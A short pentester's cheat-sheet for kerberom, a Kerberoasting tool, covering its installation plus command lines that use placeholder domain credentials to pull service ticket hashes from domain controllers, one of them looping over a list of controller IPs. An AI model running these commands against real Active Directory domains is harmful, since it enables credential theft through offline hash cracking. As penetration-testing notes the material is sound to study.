## kerberom

https://github.com/Fist0urs/kerberom


### installation

I recommend installing it in a virtualenv because it requires very specific versions.

```
git clone https://github.com/Fist0urs/kerberom
cd kerberom
pipenv shell
pip install -r requirements.txt
```

Next time, it will be possible to use it by simply enter in the virtualenv:

```
source ~/.local/share/virtualenvs/kerberom-*/bin/activate
```

### basic usage

```
python2 ./kerberom.py -u jdupond@contoso.local -d 192.168.0.1 -o kerberoast_13100.hash -p 'P@$$w0rd' -v
```

### strange usage

to check on multi DC (why even doing that?):

```
cat ../targets/scope_dc_ips.txt  | while read ip ; do ~/.virtualenvs/kerberom-Je8c-G6u/local/bin/python2 ~/tools/kerberom/kerberom.py -d $ip -u jdupond@contoso.local -p Passw0rd -v | tee kerberom_$ip.log ; done
```





